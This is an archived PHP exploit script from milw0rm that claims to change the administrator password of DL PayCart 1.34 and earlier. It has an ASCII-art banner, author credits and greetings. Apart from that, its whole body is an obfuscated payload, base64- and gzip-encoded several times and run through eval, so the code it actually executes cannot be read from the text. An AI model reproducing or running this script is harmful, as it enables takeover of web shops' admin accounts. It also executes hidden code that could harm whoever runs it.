<?php
/*
==============================================================================
                      _      _       _          _      _   _ 
                     / \    | |     | |        / \    | | | |
                    / _ \   | |     | |       / _ \   | |_| |
                   / ___ \  | |___  | |___   / ___ \  |  _  |
   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
                                                             

==============================================================================
                      ____   _  _     _   _    ___    _  __
                     / ___| | || |   | \ | |  / _ \  | |/ /
                    | |  _  | || |_  |  \| | | | | | | ' / 
                    | |_| | |__   _| | |\  | | |_| | | . \ 
                     \____|    |_|   |_| \_|  \___/  |_|\_\

==============================================================================
	DL PayCart <= 1.34 Admin Password Changing Exploit
==============================================================================

	[Â»] Script:             [ DL PayCart ]
	[Â»] Language:           [ PHP ]
	[Â»] homepage:           [ http://www.dinkumsoft.net/ ]
	[Â»] Type:               [ Commercial ]
	[Â»] found-report:       [ 26.11.2008-02.12.2008 ]
	[Â»] Founder.coder:      [ G4N0K <mail.ganok[at]gmail.com> ]

===[ LIVE ]===

	[Â»] removed...


	
===[ Greetz ]===

	[Â»] ALLAH
	[Â»] Tornado2800 <Tornado2800[at]gmail.com>
	[Â»] B13
	[Â»] AFSHIN-ZARBAT <afshin.zarbat[at]yahoo.com>
	[Â»] QU1E <evilinhell87[at]yahoo.com>
	[Â»] Hussain-X <darkangel_g85[at]yahoo.com>

	//Are ya looking for something that has not BUGz at all...!? I know it... It's The Holy Quran. [:-)
	//ALLAH,forgimme...
*/

error_reporting(E_ALL);
	$G4N0K = "vVlJm6LKEv1BvWGyShZ3ISiQFKCgjDsgq5iV1yiIv/5FAlpadav6vvv66wUfmuYQw4mIE2ngGoeo".
                 "X8w3yzNyVrS+NA9zZFsbk7YCe2UnoWIdI1EwHVvVt7aeoIxqNTq+mP28tSRrhaR0WIeWq5MuCnZc".
                 "SaeYKanQ5U++27Ua5axRtshgHypeHlqNxSzuZ6zez9q4iltHQu2rnFKR2501yrItkeeGM5erI1bU".
                 "NNobNZbLNqqkRqssKhDRDyLjJBcXuedTfKG+3F/fFbP1dtrzulZ20mDJGWJ+PgaelSI4HysL+CzR".
                 "oefzqDDaaG+V0d48OkrZBVuU+Ax/wrJzwksqgzeHRf6AZbpZ90IeylIfMw61cRzbyigO9G03CfWy".
                 "USyQ/VxuCktHkpC+2kYa781ks6QSfctdDFEQApmuo0wwfc+4YIbvA1FYwn6ngClPQS9Ir4rQRGBP".
                 "pHSJdbHW+qqZa+y073CGQb265xIp1iyWbR6B3K+K2fqscUE56FipbaCUz6C3GlSgg0hXvgtnKsWT".
                 "I0uHiKFTTVxkO8XJQxdsscK9784K0LlBoqpj16gDeZXYDPi1F5yoKvOIsUqUdYlTOX0AsvrbLjE9".
                 "tQZ/N2iVlpESlOCznIzHwzr6EsDvQd4YYlJmvmv8DFi1xXCO5oKtZb5fZ8bSpMij38t6Cb26XOdp".
                 "h5ewdk/BeupladZV6DpNoBglVsY9I1YtAg89xQzfhK6Z6J7AIdFYAaIApTbsWfMP60ShCVxcRpWZ".
                 "vHbUi+gGLfE3Zpw6YFJqDXaLZJPIMp5bBXXgngviZ6Q4jSYKD3uF3qMc+rJJIlfqiR/X+eIZKUIa".
                 "yFYdVfH4m1xeiH5YKZtgV58iZlauQY43k3oJqrKMZAtsZpJ5gz185lz6sK9f8VS4HM6CMw1K80b/".
                 "r6sZxIg9zI1lqQhkwM/lcNYVgbvu+0H/OtoL9GS/CnyQ4mUNNgmov5dDykD/YX/MlAWWkyd9Z3ax".
                 "kkz+Ore+Zz5FslPhUT4q8FJKcyXwBz6t9+poV2Jr72aLY1yV+1Axn3T2XU6IcwYpxwecrPf4EHpW".
                 "uQa8xhWuo7xOsWe1a0aFOLfKOD/kRu4z5EFLqXsVhUvEnOtgeWQB12CzA6svhe51eeRJDtDY0W5D".
                 "DEEsB65UDJ9lEi/FkCfAhgySjYbE5marFjhD7+NT3MH4o56VUZLcEedNtsnPXVzZZA2/2VF/4jHE".
                 "bJEg8atHeLt+9vrPY8MjzR/G3+d9eBbUy9fnLBKtF+LhM+Stt2nsTRTmd3NaJHXv43fzPj5gv290".
                 "moOM41nv+4/73cnyNp5Fxs9vH+S4f76zH8jLv41njft49HzUbxifZKH58SxyvjT+/p39tjaXOKtU".
                 "QquZsLPtZEf5iUbP28H2Eh+P58D+7HQOfAY7tV5P/CTEHj2MT3r9G/v91ucX+PuND9jvD8UU/yv7".
                 "Df7pp9i5xs/wnmLrhg/yXXj7MqZ+ab8RX2O8nCeMw2epu2K/Jed6Uyxo/aL9zn7f5In5PX7fBoxP".
                 "WJbOU6wK728xhhj7Wu5v7adc8Tvie7AnO+7r3XLDFLMwR8umvPJP7LdyuFg+tyHUL3NfENmv8TPo".
                 "SM65vj0iwxBP/BvRhcg0xJ/47/Lf73z+aP34DVz1j8qbd22sqOUG3qQukxq+lSxjRzhIZsk7WjU2".
                 "26G/ka3CJ5y/AI6f+C5wA4bj0bVeX2t7xffRVph4GXD9iesYO3vgOigTUh/4d0TW7pvCow3JLgN4".
                 "mr29Sk3yfbfy955HZUimgQenbQA9QyzzwPfIGTXYzzog6CHW0CfEjNGHnkBphBftzu/8jPQnSTEH".
                 "PrUPgP8Al8g2WXDy90a3puwE+E2H5C6JeqFGillFlXqJl9AbMOgH8Jkrt/0BfKaHvEF0UzfAW2Gf".
                 "Jtxx85HPdQnRFzgMDTzszaJmGspnKAJutAZ7TnPGtcAnY4Vw3xvvuXHdB74lLgYWtmZxHSjWYZ2v".
                 "2IGD9igBXg42c/rQ4ZVd0YB9Zmnk2o9jj30MfA/SSHHgPJRtBpmKSZ5zTXTxXbWEPrCKWARrhDbe".
                 "W5Me3GSTowly/kZ9zCsO6smvPZY+6nMnRyZQr55w44nwnQHs0QRb6+Xin+iUAoY+6UQw9Pt0ij/o".
                 "JFHhZ53e5fhGJ60f8QcYm/BbAAbPqV85DZKDNs6pLNrjDjOf/LQOvPhoy9IlZjFwevOJ7DPYYoqF".
                 "0J11GHJ5zFqziGCkunH/sd9TSC9ZFtD3gX768y12L4T3E13KAmQ+YVZgg4/6VTM2VnDhUXi9Baxi".
                 "0vfvrr0+fK+kBpN52aAfDTJBrA3+yuKp3xd3kIPee6Zb7D3E4NVHoyz7iP4oB24/yhCzTha55YOd".
                 "TdcY7ljQFv3dvn3gQQ755EO1JP3rp/0rh8h7F2vqdlgP+epOdtAX/FdRRH+SQ4cxf48S7cJd30M+".
                 "vuZhC7pQ0tOFrp+8QL9Lzn4RrTd7xe8cqdkHDD9gQKWpGol+hT7PybCn1qO8Kn7ZLio1W6SBS3dY".
                 "KQ6qxJs72rDd/i5/lV/vdY9rb1skauYnyHWOMeScb+ZBfh1qSRezUA+3i2xXOazpWsfQ5Xh/fFdk".
                 "bMDuZQUY4aAuCBubtqJHXKlYy9DdXPTLuWQ/xxMKiPdS3aHOBp0w6e1ZPSO2VWUDetdZHsr8TwS1".
                 "GmKjh5pxAn2IvPU4p25Dxh5kH3QUF5mWfaUvl006tfH7WadYTrsNc27BZzQWBeRIlqldVifdOfee".
                 "zGX352g5laAibeH8JySi0xd+OqHyi7UlwSM6mqSG7WGPFd2+VmUTyavW2HIdElMPckERsfiy7gUH".
                 "ntt36KNstLRP+q5JApc7Oo7+jBSVgTp0WoPPLcbJQ2be6vmig/xL63nRGZkgh55aQi3ktIt+0qWv".
                 "dDqWgbcAuc41rmzIqXr39VzIRdWsnLjCE5LHtf6w1onj8nxC+YCr/0TMsUQi8AlRXUbMjAJ/Upoz".
                 "1EFYJ3XAYWufkYZ419jkiFnMau4Qi0eIj4b4n9zJBd/JMt1n7gAbAQs5PxswALhxTj6TtmHPZZ6i".
                 "xtEXPlEV4ETiNCdDz4+c3oJ8ow/4GnV6564qYAvLUh72Cx7yP9Qf42fECmWUJe+4v6v/3ra7G7+r".
                 "oyXVqLLTx9Ws1cQF1DS1J1iHz7QuFo/yyGX1Iq5IzFDkDunFaz73IDLgQJ4f0DV/E361xwcf6osP".
                 "WEBKmSLZagFXey3jIM8uphw322GXpkJ54Lws8RVScA9+u80bONiH3H/NmSgrnj/3DgLYz4LY4J4/".
                 "yal8vtMJhjv7JNvIVo2zK1elY1QNd5hPEeGwrtSgZdpBrIIN0jZyV8+3e8GeHu/58pHTepDn3f6I".
                 "0RJs8I7bMhC5kzbYZ5A/25TNT4/YIZ/tCCcltoHYKmPPKSHWT6A/sVFLOI2fc9nLrvks+x735B4P".
                 "8lOKFSv1maaZcDbkqg92YcHOTbBN0qBy2gAwc/Pptnz+qq9UiUw9xwcVLrGiH94xCLb/u370g42D".
                 "ymiAA9/LWK/7YZ0qbkd8QQ4Cu6s1weDLiH9yX37BrpFD7bwEe6eJlCKb5FRFsyxJnMGc6IWmwIZc".
                 "YnlpF8l8DRwDOMsqGWx8xePN1tx8vAsXIMbPwJ/Az1DHA6kDvAppzBos4XgI6oAP/gjc0Q9TH1CR".
                 "fPJ5zxnhWkn8zrWSEOJ3ygm3uvDA00i+Hv2aXDFNMLOR0Q/IUQXwkxO5446A561v81ZJCL4IiMzV".
                 "8B/Lk9bPH864r+//pCYRrE7/1/zfe4F90s1d/P+P7wvse7pxbafLBj8t6xP4A/J8l6wVAXKDlUJt".
                 "Pvq74+S/Q07+51jT4L/i8X5i+n9n9B9rdL7LfZ1Hhv9SCnW499xCPoWeEXjKlBsW2c03Kx76Yz2B".
                 "PAncQJ0hsUsgzukN5FHAlIvd8wlyKfBz0AF47SZbnKAWJRrwrAc83t4Tv4MaQO7q72K1Au54CcUE".
                 "YkWAXO80MdSO116YcD/24muW/Ifz11//BQ==";
                 eval(base64_decode(gzinflate(base64_decode($G4N0K))));

?>

# milw0rm.com [2008-12-07]